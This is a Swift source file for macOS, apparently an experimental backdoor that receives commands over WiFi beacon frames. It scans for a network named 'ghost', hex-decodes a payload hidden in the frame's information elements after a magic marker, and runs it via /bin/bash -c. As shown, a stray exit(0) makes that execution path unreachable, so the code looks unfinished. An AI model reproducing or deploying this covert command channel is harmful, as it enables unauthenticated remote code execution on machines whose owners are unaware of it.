//
//  main.swift
//  gt
//
//  Created by JcQ~ on 2018/5/24.
//  Copyright © 2018 金灿权. All rights reserved.
//

import Foundation
import CoreWLAN

func changeToInt(num:String) -> Character {
    let str = num.uppercased()
    
    var sum = 0
    
    for i in str.utf8 {
        
        sum = sum * 16 + Int(i) - 48 // 0-9 从48开始
        
        if i >= 65 {
            sum -= 7
        }
    }
    let ch:Character=Character(UnicodeScalar(sum)!)
    return ch
}

extension String {
    //返回第一次出现的指定子字符串在此字符串中的索引
    //（如果backwards参数设置为true，则返回最后出现的位置）
    func positionOf(sub:String, backwards:Bool = false)->Int {
        var pos = -1
        if let range = range(of:sub, options: backwards ? .backwards : .literal ) {
            if !range.isEmpty {
                pos = self.distance(from:startIndex, to:range.lowerBound)
            }
        }
        return pos
    }
}

func hexToStr(str:String)-> String{
    var c_str:[Character]=[]
    var tmp:[Character]=[]
    for c in str{
        tmp.append(c)
        if tmp.count == 2{
            let c = changeToInt(num: String(tmp))
            c_str.append(c)
            tmp.removeAll()
        }
    }
    return String(c_str)
}

func hexTodec(number num:String) -> Int {
    let str = num.uppercased()
    var sum = 0
    for i in str.utf8 {
        sum = sum * 16 + Int(i) - 48 // 0-9 从48开始
        if i >= 65 {                 // A-Z 从65开始，但有初始值10，所以应该是减去55
            sum -= 7
        }
    }
    return sum
}



var raw_data=""
var client=CWWiFiClient()
var itf=client?.interface()
var ssid="ghost"
while 1==1{
    print(ssid)

    var test=CWNetwork()
    print("try")
    try
        itf?.scanForNetworks(withName: nil)
    print("cache")
    let cache=itf?.cachedScanResults()
    print("cachefor")
    for i in cache!{
        var ss=""
        for k in i.ssid!{
            
            ss=ss+String(k)
        }
        print(ss)
//        print(i.ssid)
        test=i
    }
    //查看是否有目标ssid的帧
    if(test.ssid==nil){
        continue
    }else{
        if(test.ssid==ssid){
            print("yes")
            exit(0)
        //对接收到的帧进行数据整合
        let da=test.informationElementData
        for i in da!{
            let hex=String(format:"%02x",i)
            raw_data=raw_data+hex
        }
        //查询是否为目标帧
        //raw_data="dd196161616161636363616f69646675616466706f61696466706f"
        let flag=raw_data.range(of: "636363")
        if(flag==nil){
//            print("cant find ")
            //continue
        }else{
            //获取magic字段位置
            let shell_pos=raw_data.positionOf(sub: "636363")
            //获取payload长度
            let payload_length_start_index=raw_data.index(raw_data.startIndex,offsetBy:shell_pos-12)
            let payload_length_end_index=raw_data.index(raw_data.startIndex,offsetBy:shell_pos-10)
            let payload_length=hexTodec(number:String(raw_data[payload_length_start_index..<payload_length_end_index]))
            //获取ssid字段
            let ssid_start_index=raw_data.index(raw_data.startIndex,offsetBy:shell_pos-10)
            let ssid_end_index=raw_data.index(raw_data.startIndex,offsetBy:shell_pos)
            ssid=hexToStr(str: String(raw_data[ssid_start_index..<ssid_end_index]))
            //获取payload字段
            let payload_start_index=raw_data.index(raw_data.startIndex,offsetBy:shell_pos+6)
            let payload_end_index=raw_data.index(raw_data.startIndex,offsetBy:shell_pos+(payload_length-5)*2)
            let payload=hexToStr(str: String(raw_data[payload_start_index..<payload_end_index]))
            print("next_ssid:"+ssid)
            print("payload:"+payload)
            
            //执行payload
            let task=Process()
            task.launchPath="/bin/bash"
            task.arguments=["-c",payload]
            task.launch()
            print("done")
            }
    }
        }
    }



